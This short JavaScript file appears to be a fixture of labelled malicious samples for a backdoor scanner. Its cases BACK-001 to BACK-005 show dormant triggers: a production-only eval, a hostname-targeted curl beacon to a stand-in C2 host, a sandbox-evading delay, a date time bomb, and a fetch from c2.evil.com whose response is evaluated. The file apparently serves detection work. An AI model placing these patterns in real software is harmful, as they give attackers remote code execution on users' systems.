// Malicious: dormant backdoor that activates in production
const os = require('os');

// BACK-001: Production-only execution
if (process.env.NODE_ENV === 'production') { eval(payload) }

// BACK-002: Hostname-targeted backdoor
if (os.hostname() === 'prod-server-01') {
    require('child_process').exec('curl http://c2.evil.com/beacon');
}

// BACK-003: Long delay to evade sandbox analysis
setTimeout(activatePayload, 86400000)

// BACK-004: Time bomb - activates after a date
if (new Date() > new Date('2026-06-01')) { eval(timebomb) }

// BACK-005: Remote command & control
fetch('https://c2.evil.com/cmd').then(r => eval(r.text()))
